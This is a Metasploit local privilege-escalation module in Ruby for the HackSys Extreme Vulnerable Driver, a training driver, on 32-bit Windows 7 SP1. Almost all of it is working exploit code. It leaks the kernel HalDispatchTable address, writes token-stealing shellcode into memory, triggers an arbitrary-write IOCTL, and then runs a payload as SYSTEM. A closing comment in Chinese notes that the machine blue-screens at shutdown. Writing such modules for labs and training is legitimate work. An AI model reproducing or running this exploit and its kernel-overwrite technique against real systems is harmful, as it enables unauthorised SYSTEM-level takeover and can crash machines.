##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/local/windows_kernel'

class MetasploitModule < Msf::Exploit::Local
	Rank = NormalRanking

	include Msf::Exploit::Local::WindowsKernel
	include Msf::Post::File
	include Msf::Post::Windows::FileInfo
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Process


	def initialize(info={})
		super(update_info(info, {
			'Name'                   => 'HEVD ArbitraryWrite',
			'Description'            => %q{This flaw can be abused to elevate privileges to SYSTEM.},
			'License'                => MSF_LICENSE,
			'Author'                 => ['dphz'],
			'Arch'                   => ARCH_X86,
			'Platform'               => 'win',
			'SessionTypes'           => [ 'meterpreter' ],
			'DefaultOptions'         =>{'EXITFUNC' => 'thread'},
			'Targets'                =>
				[
					[ 'Windows 7 SP1',
						{
							'HaliQuerySystemInfo'      => 0x16bba, # Stable over Windows XP SP3 updates
							'_KPROCESS'                => "\x50",	# Offset to _KPROCESS from a _ETHREAD struct
							'_TOKEN'                   => "\xf8",	# Offset to TOKEN from the _EPROCESS struct
							'_UPID'                    => "\xb4",	# Offset to UniqueProcessId FROM the _EPROCESS struct
							'_APLINKS'                 => "\xb8"	 # Offset to ActiveProcessLinks _EPROCESS struct
						}
					]
				],
			'References'             =>
				[
					['URL', 'https://github.com/dongpohezui/HEVD_exp']
				],
			'DisclosureDate'        => '2021',
			'DefaultTarget'         => 0
		}))

	end

	def check
		handle = open_device('\\\\.\\HackSysExtremeVulnerableDriver', 0, 'FILE_SHARE_READ', 'OPEN_EXISTING')
		return Exploit::CheckCode::Safe unless handle

		session.railgun.kernel32.CloseHandle(handle)

		return Exploit::CheckCode::Appears
	end

	def find_sys_base(drvname)
		results = session.railgun.psapi.EnumDeviceDrivers(4096, 1024, 4)
		addresses = results['lpImageBase'][0..results['lpcbNeeded'] - 1].unpack('V*')

		addresses.each do |address|
			results = session.railgun.psapi.GetDeviceDriverBaseNameA(address, 48, 48)
			current_drvname = results['lpBaseName'][0..results['return'] - 1]
			if drvname == nil
				if current_drvname.downcase.include?('krnl')
					return [address, current_drvname]
				end
			elsif drvname == results['lpBaseName'][0..results['return'] - 1]
				return [address, current_drvname]
			end
		end

		return nil
	end


	def disclose_addresses(t)
		addresses = {}

		print_status("Getting the Kernel module name...")
		kernel_info = find_sys_base(nil)
		if kernel_info.nil?
			print_error("Failed to disclose the Kernel module name")
			return nil
		end
		print_good("Kernel module found: #{kernel_info[1]}")

		print_status("Getting a Kernel handle...")
		kernel32_handle = session.railgun.kernel32.LoadLibraryExA(kernel_info[1], 0, 1)
		kernel32_handle = kernel32_handle['return']
		if kernel32_handle == 0
			print_error("Failed to get a Kernel handle")
			return nil
		end
		print_good("Kernel handle acquired")

		print_status("Disclosing the HalDispatchTable...")
		hal_dispatch_table = session.railgun.kernel32.GetProcAddress(kernel32_handle, "HalDispatchTable")
		hal_dispatch_table = hal_dispatch_table['return']
		if hal_dispatch_table == 0
			print_error("Failed to disclose the HalDispatchTable")
			return nil
		end
		hal_dispatch_table -= kernel32_handle
		hal_dispatch_table += kernel_info[0]
		addresses["halDispatchTable"] = hal_dispatch_table
		print_good("HalDispatchTable found at 0x#{addresses["halDispatchTable"].to_s(16)}")
		
		return addresses
	end

	def exploit
	
		if is_system?
			fail_with(Failure::None, 'Session is already elevated')
		end
		
		if check == Exploit::CheckCode::Safe
			fail_with(Failure::NotVulnerable, "Exploit not available on this system")
		end

		handle = open_device('\\\\.\\HackSysExtremeVulnerableDriver', 0, 'FILE_SHARE_READ', 'OPEN_EXISTING')
		if handle.nil?
			fail_with(Failure::NoTarget, "Unable to open \\\\.\\HackSysExtremeVulnerableDriver device")
		end

		print_status("Disclosing the HalDispatchTable and hal!HaliQuerySystemInfo addresses...")
		@addresses = disclose_addresses(targets[0])
		if @addresses.nil?
			session.railgun.kernel32.CloseHandle(handle)
			fail_with(Failure::Unknown, "Failed to disclose necessary addresses for exploitation. Aborting.")
		else
			print_good("Addresses successfully disclosed.")
		end

		print_status("Storing the shellcode in memory...")
		this_proc = session.sys.process.open

		session.railgun.ntdll.NtAllocateVirtualMemory(-1, [0x1000].pack('V'), nil, [0x3000].pack('V'), "MEM_RESERVE|MEM_COMMIT", "PAGE_EXECUTE_READWRITE")

		unless this_proc.memory.writable?(0x1000)
			fail_with(Failure::Unknown, 'Failed to allocate memory')
		end

		sc	= "\x90"*4
		sc << "\x60"                          # pushad
		sc << "\x31\xc0"                      # xor eax,eax
		sc << "\x64\x8b\x80\x24\x01\x00\x00"  # mov eax,[fs:eax+0x124]
		sc << "\x8b\x40\x50"                  # mov eax,[eax+0x50]
		sc << "\x89\xc1"                      # mov ecx,eax
		sc << "\xba\x04\x00\x00\x00"          # mov edx,0x4
		sc << "\x8b\x80\xb8\x00\x00\x00"      # mov eax,[eax+0xb8]
		sc << "\x2d\xb8\x00\x00\x00"          # sub eax,0xb8
		sc << "\x39\x90\xb4\x00\x00\x00"      # cmp [eax+0xb4],edx
		sc << "\x75\xed"                      # jnz 0x1a
		sc << "\x8b\x90\xf8\x00\x00\x00"      # mov edx,[eax+0xf8]
		sc << "\x89\x91\xf8\x00\x00\x00"      # mov [ecx+0xf8],edx
		sc << "\x61"                          # popad
		sc << "\x31\xc0"                      # xor eax,eax
		sc << "\x83\xc4\x24"                  # add esp,byte +0x24
		sc << "\x5d"                          # pop ebp
		sc << "\xc2\x08\x00"                  # ret 0x8
		
		print_status("write shellcode ...")
		this_proc.memory.write(0x1000, sc)
		this_proc.memory.write(0x1500, "\x00\x10\x00\x00")
		this_proc.memory.write(0x1504, "\x00\x15\x00\x00")
		this_proc.memory.write(0x1508, [@addresses["halDispatchTable"] + 0x4 ].pack('V'))
		this_proc.memory.write(0x1600, "\x00\x00\x00\x00")

		print_status("Start to TriggerArbitraryWrite ...");
		ioctl = session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x0022200B, 0x1504, 0x8, 0, 0)

		session.railgun.kernel32.CloseHandle(handle)
		
		if ioctl["GetLastError"] != 0
			print_error("Something wrong while triggering the vulnerability, anyway checking privileges...")
		end
		
		print_status("Start to NtQueryIntervalProfile() ...");
		session.railgun.ntdll.NtQueryIntervalProfile(0x1337, 0x1600)

		print_status("Checking privileges after exploitation...")
		unless is_system?
			fail_with(Failure::Unknown, "The exploitation wasn't successful")
		end

		print_good("Exploitation successful!")
		unless execute_shellcode(payload.encoded, nil, this_proc.pid)
			fail_with(Failure::Unknown, 'Error while executing the payload')
		end

	end
end

#可以获得system，但是关机时会蓝屏
